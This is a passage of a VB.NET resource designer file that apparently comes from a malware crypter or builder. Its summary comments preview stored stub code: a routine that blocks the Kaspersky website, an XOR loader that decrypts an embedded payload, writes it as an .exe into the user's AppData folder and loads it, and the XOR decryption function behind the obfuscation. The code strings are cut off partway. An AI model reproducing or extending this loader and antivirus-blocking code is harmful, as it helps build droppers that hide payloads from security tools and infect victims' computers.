        '''            WebBlock(&quot;www.kaspersky.com/vir [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Websites() As String
            Get
                Return ResourceManager.GetString("Websites", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Dim N As String = xEncryptionD(R.GetObject(&quot;K&quot;), R.GetObject(&quot;NM&quot;))
        ''' Dim I As String = Environ(&quot;APPDATA&quot;) &amp; &quot;\&quot; &amp; N &amp; &quot;.exe&quot;
        ''' If IO.File.Exists(I) Then
        '''	IO.File.Delete(I)
        ''' End If
        ''' Dim II As Byte() = System.Text.Encoding.Default.GetBytes(xEncryptionD(R.GetObject(&quot;K&quot;), _
        ''' R.GetObject(&quot;I&quot;)))
        ''' Try
        '''	My.Computer.FileSystem.WriteAllBytes(I, II, False)
        ''' Catch
        ''' End Try
        ''' Dim III As Byte() = System.Text.Encoding.Default.GetBytes(xEncryptionD(R.GetObject(&quot;K&quot;), _
        ''' R.GetObject(&quot;F&quot;)))
        ''' LoadMethod(&quot;IX&quot;, &quot;R&quot;,  [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property XORLoader() As String
            Get
                Return ResourceManager.GetString("XORLoader", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Shared Function xEncryptionD(ByVal CodeKey As String, ByVal DataIn As String) As String
        '''
        '''        Dim lonDataPtr As Long
        '''
        '''        Dim strDataOut As String = &quot;&quot;
        '''
        '''        Dim intXOrValue1 As Integer
        '''
        '''        Dim intXOrValue2 As Integer
        '''
        '''        Dim H As String = &quot;&amp;H&quot;
        '''
        '''        For lonDataPtr = 1 To (Len(DataIn) / 2)
        '''
        '''            intXOrValue1 = Val(H &amp; (Mid$(DataIn, (2 * lonDataPtr) - 1, 2)))
        '''
        '''            intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
        '''
        '''         [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property XORRev() As String
            Get
                Return ResourceManager.GetString("XORRev", resourceCulture)
            End Get
        End Property
    End Module
End Namespace
